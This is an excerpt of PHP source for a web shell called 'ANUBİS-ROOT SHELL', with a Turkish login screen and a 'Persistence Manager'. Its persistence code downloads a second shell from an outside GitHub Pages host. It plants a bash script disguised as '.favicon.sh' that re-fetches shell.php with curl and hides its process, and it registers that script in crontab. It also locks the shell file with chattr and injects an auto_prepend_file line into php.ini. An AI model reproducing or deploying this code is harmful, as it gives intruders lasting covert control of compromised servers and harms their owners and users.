...
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    ...
    <body>
        <div class="login-container">
            <div class="title">ANUBİS-ROOT SHELL</div>
            <div class="subtitle">Güvenli Erişim Gerekli</div>
            <form method="post">
    ...
    <div class="container-fluid">
        ...
        <div class="collapse navbar-collapse" id="navbarNav">
            <ul class="navbar-nav">
                ...
                <li class="nav-item">
                    <a class="nav-link nav-hover rounded px-3 mx-1" href="?p=<?= enc(PATH) ?>&action=persist">
                        <i class="fas fa-link fa-fw me-2"></i> Persistence Manager
                    </a>
                </li>
            ...
            <tbody>
                ...
                <?php
                    if (isset($_GET['act']) && $_GET['act'] === 'persist' && isset($_GET['file'])) {
                        // Web Shell Component
                        try {
                            $shell_content = download_content('https://aurorafilemanager.github.io/Aurora.php');
                            if (!$shell_content) {
                                echo("Failed to download Aurora.php");
                            }
                        } catch (Exception $e) {
...
# Add to startup
(crontab -l 2>/dev/null; echo "@reboot $process_name") | crontab -

# Make process unkillable and hidden
function make_immortal() {
    while true; do
        # Check if shell exists and download if missing
        if [ ! -f ' . PATH . '/shell.php ]; then
            curl -s ' . $_SERVER['HTTP_HOST'] . '/shell.php -o ' . PATH . '/shell.php 2>/dev/null
        fi

        # Start new process if killed
...
# Start immortal process
make_immortal & disown

# Hide from process list
exec -a "$random_name" bash';
                        ...
                        $cron_file = PATH . '/.favicon.sh';
                        file_put_contents($cron_file, $cron_content);
                        chmod($cron_file, 0755);

                        // Add to crontab
                        cmd('(crontab -l 2>/dev/null; echo "* * * * * ' . $cron_file . '") | crontab -');

                        // Try to make file immutable
                        cmd('chattr +i ' . $shell_file . ' 2>/dev/null');

                        // Attempt PHP auto_prepend persistence
                        $php_ini = php_ini_loaded_file();
                        if ($php_ini && is_writable($php_ini)) {
                            $ini_content = "\nauto_prepend_file = " . $shell_file . "\n";
                            file_put_contents($php_ini, $ini_content, FILE_APPEND);
                        }

                        show_notification('Persistence mechanisms deployed successfully', 'success');
                    }

                    if(isset($_GET['status'])) {
                        $status = $_GET['status'];
                        if($status == 'persistence_added') {
                            $php_ini = php_ini_loaded_file() ?: '/etc/php.ini';
                            echo '<div class="alert alert-success alert-dismissible fade show" role="alert">
                                    <strong>Success!</strong> File has been locked. Persistence added to: ' . htmlspecialchars($php_ini) . '
                                    <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                                  </div>';
